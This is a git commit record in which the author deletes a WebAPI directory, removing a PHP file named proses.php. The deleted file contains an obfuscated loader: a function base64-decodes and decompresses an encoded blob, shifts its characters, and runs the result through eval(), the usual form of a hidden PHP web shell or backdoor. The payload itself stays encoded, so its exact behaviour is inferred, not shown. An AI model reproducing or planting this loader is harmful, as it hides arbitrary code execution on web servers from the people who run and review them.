1ab66ce0d68cab2029ce35207f8a491fd6ce4b9a
Anjas amar pradana <anjastech01@gmail.com>
2022-06-06 03:07:26 +0700

    Delete WebAPI directory

--- WebAPI/proses.php
+++
@@ -1,9 +0,0 @@
-<?php function jHhBnV($VSof)
-{ 
-$VSof=gzinflate(base64_decode($VSof));
- for($i=0;$i<strlen($VSof);$i++)
- {
-$VSof[$i] = chr(ord($VSof[$i])-1);
- }
- return $VSof;
- }eval(jHhBnV("pVRda+MwEHyPfsUiArEPekmejXvkGl9b6JGQuByHMUGxN42uruVYcksp+e2V/BG7yREK1Ytt7exoVjtrALMIGQ6X/CljKcSYPuhHyp4YbHiCkOVCovyebTOS467gOQJ9FCk+Sh6vzTZ1COnxjcWlRGX1V9eeHwykYgoHoQ2zBXQDlMc0tO030oMeQP92CtVyoRN3SM8ES45usGF1SJXUj5lidfquwPzVokvvzrvy4Rv8Wsx+g2JrTFZarcpFAn9uvIUH+kgXBvrkAbWD0YHLLL4Bq+QMqP937tEQXBfoJFL8GeFOvFAb3jrwQ0olVGPHp4BSZw2AkXMU3R99YyLxLMP4HMP+s7Xc8Iftl4sZf7mY0fliahfsksYi9H4+nfjeUVuXng9L3+ybvlYWOe117anauReXlV8Mu+3owH9kaou2euqX4bAaBxCFygqlp+WZR0gO9/dhCOhasLy0e3uRRkO53Tq+RjldSG3sz9ia2p3MDsdG5Miibe0CYBL6uXj5KKXS3AhyS0RAf84mi6mWbYa027Z/UqRBBbme385oGEKTUt5/Obgt+Z6cvHdLzFEWidIMhnaFaSRitMoz7JYGMNqKBqv/Myc+IfDj8h0="));?>
